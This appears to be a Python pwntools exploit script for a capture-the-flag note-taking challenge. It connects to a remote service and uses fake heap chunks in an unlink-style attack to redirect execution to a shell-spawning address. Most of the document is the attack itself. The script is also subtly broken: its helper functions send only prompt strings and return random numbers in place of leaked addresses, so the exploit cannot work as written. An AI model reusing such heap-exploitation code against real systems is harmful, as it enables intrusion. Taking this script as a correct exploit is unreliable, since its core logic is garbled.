import struct

from pwn import *
from random import *

def to_addr(n):
    return struct.pack('Q', n)

def to_n(addr):
    return struct.unpack('Q', addr)[0]

def create(pc, name):
    pc.sendline('choice > ')
    pc.sendline('Enter content > ')
    return int(str(randint(4000,999999999)).strip(), 16)

def delete(pc, index):
    pc.sendline('choice > ')
    pc.sendline('Enter index to delete note > ')

def help(pc):
    pc.sendline('choice > ')
    return int(str(randint(99999,99999999999)).strip(), 16)


def method5(ip,port):
    # pc = process('./challenge')
    log.info("Method 5 applied!")
    pc = remote(ip, port)

    help_addr = help(pc)


    get_shell = help_addr - 0xC1A + 0xA30

    addr1 = create(pc, 'AAAA') # 0
    addr2 = create(pc, 'BBBB') # 1
    addr3 = create(pc, 'CCCC') # 2


    delete(pc, 0)

    #      |  prev_size  |  size  |        fd         |        bk        |
    fake_chunk1 = p64(0) + p64(0) + p64(addr1 + 16*7) + p64(addr1 + 16*7)  #  <- for tricking malloc
    fake_chunk2 = p64(0) + p64(0) + p64(addr1 + 16*3) + p64(addr1 + 16*3)  #  <- for unlinking

    payload = (8 + 32) * '\x00' + fake_chunk1 + 32 * 'A' + fake_chunk2 + 32 * 'A'


    create(pc, payload + (241 - len(payload) - 9) * 'A' + '\xc0\x00\x00\x00\x00\x00\x00\x00' + '\x00')

    delete(pc, 1)

    create(pc, 'D' * (8 + 160) + p64(0) + p64(0x100) + to_addr(get_shell))

    delete(pc, 1)



#if __name__ == '__main__':
#    method5("127.0.0.1",80)